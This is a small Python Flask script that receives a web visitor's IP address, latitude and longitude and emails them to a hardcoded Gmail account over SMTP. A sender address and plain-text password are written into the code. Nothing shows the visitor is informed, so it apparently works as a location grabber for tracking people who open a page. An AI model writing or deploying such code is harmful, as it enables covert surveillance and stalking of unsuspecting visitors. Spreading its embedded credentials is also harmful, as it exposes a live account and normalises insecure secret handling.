from flask import Flask, request
import smtplib
import geocoder

app = Flask(__name__)

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/send_location', methods=['POST'])
def send_location():
    ip_address = request.form['ip_address']
    latitude = request.form['latitude']
    longitude = request.form['longitude']

    if latitude and longitude:
        location = (float(latitude), float(longitude))
        send_email(ip_address, location)
    else:
        send_email(ip_address, None)

    return 'Result sent to Gmail!'

def send_email(ip_address, location):
    sender_email = 'titolion980@gmaoil.com'
    receiver_email = '01028838444a@gmail.com'
    password = 'Gomaa@123'

    subject = 'IP and Location Information'
    message = f'IP Address: {ip_address}\n'
    if location:
        message += f'Latitude: {location[0]}, Longitude: {location[1]}'

    email_text = f'Subject: {subject}\n\n{message}'

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, email_text)

if __name__ == '__main__':
    app.run()
